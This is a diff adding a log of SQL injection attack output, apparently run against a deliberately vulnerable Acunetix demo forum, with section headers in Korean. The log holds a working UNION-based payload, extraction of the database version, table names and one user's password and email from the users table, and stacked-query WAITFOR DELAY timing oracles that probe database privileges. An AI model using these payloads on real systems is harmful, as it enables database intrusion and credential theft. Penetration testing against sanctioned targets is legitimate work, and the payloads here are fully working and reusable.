@@ -1,0 +1,48 @@
+========================================================================
+U1. Search.asp UNION 기반 결과 주입 (마커 확인)
+========================================================================
+  200 3985 0.366793
+  raw payload: q')>0) UNION ALL SELECT 1,'ACU-POSTER','ACU-TITLE','ACU-MESSAGE',1,1,GETDATE(),'ACU-AVATAR','ACU-TTITLE','ACU-FORUM'--
+   · ACU-POSTER','ACU-TITLE','ACU-MESSAGE',1,1,GETDATE(),'ACU-AVATAR','ACU-TTITLE','ACU-FORUM'--'</div><table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5"><tr><td valign='top' align='center' bgcolor='#FFFFFF
+   · posttitle'>ACU-TITLE</div><div class='posttext'>ACU-MESSAGE</div></td></tr></table> <!-- InstanceEndEditable --></td> </tr> <tr align="right" bgcolor="#FFFFFF"> <td colspan="2" class="footer">C
+   · posttext'>ACU-MESSAGE</div></td></tr></table> <!-- InstanceEndEditable --></td> </tr> <tr align="right" bgcolor="#FFFFFF"> <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> <
+  마커 5개 중 발견: 5 /5
+
+========================================================================
+U2. 페이지 가시 추출 — DB/계정 정보
+========================================================================
+  [version] 200 4463 0.334147
+   · posttitle'>Microsoft SQL Server 2014 (SP3-GDR) (KB5029184) - 12.0.6179.1 (X64) Jul 27 2023 21:44:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor) </
+   · posttext'>acuforum</div></td></tr></table> <!-- InstanceEndEditable --></td> </tr> <tr align="right" bgcolor="#FFFFFF"> <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> </tr
+  [tables] 200 4045 0.373516
+   · posttitle'>T</div><div class='posttext'>M</div></td></tr></table> <!-- InstanceEndEditable --></td> </tr> <tr align="right" bgcolor="#FFFFFF"> <td colspan="2" class="footer">Copyright 2019 Acun
+   · posttext'>M</div></td></tr></table> <!-- InstanceEndEditable --></td> </tr> <tr align="right" bgcolor="#FFFFFF"> <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> </tr> </t
+
+========================================================================
+U3. users 테이블 자격증명 1건 (읽기 전용, 최소 추출)
+========================================================================
+  200 4453 0.332956
+   · posttitle'>Inv1@cti</div><div class='posttext'>invicti@example.com</div></td></tr></table> <!-- InstanceEndEditable --></td> </tr> <tr align="right" bgcolor="#FFFFFF"> <td colspan="2" class="fo
+   · posttext'>invicti@example.com</div></td></tr></table> <!-- InstanceEndEditable --></td> </tr> <tr align="right" bgcolor="#FFFFFF"> <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</t
+
+========================================================================
+S1. stacked 문장 실행 차분 오라클 (showthread.asp id, 사이트 2곳 → 2배 지연)
+========================================================================
+  0;IF 1=1 WAITFOR DELAY '0:0:04'--        200 7962 8.512460   (IF 참 (지연 기대))
+  0;IF 1=2 WAITFOR DELAY '0:0:04'--        200 7962 0.588355   (IF 거짓 (지연 없음 기대))
+  0                                        200 6925 0.480630   (기준선)
+
+========================================================================
+S2. DB 권한 오라클 (권한 확인만, 쓰기 없음)
+========================================================================
+  [sysadmin            ] 200 8094 0.486895   ← (SELECT IS_SRVROLEMEMBER('sysadmin'))=1
+  [db_owner            ] 200 8084 0.549654   ← (SELECT IS_MEMBER('db_owner'))=1
+  [db_datawriter       ] 200 8094 8.525269   ← (SELECT IS_MEMBER('db_datawriter'))=1
+  [db_datareader       ] 200 8094 8.560906   ← (SELECT IS_MEMBER('db_datareader'))=1
+  [securityadmin       ] 200 8104 0.473595   ← (SELECT IS_SRVROLEMEMBER('securityadmin'))=1
+  [USER=dbo            ] 200 8068 0.523695   ← (SELECT USER_NAME())='dbo'
+  [SUSER=acunetix      ] 200 8082 8.553638   ← (SELECT SUSER_SNAME())='acunetix'
+  [INSERT perm on posts] 200 8182 8.608560   ← (SELECT HAS_PERMS_BY_NAME('posts','OBJECT','INSERT'))=1
+
+done
+EXIT=0
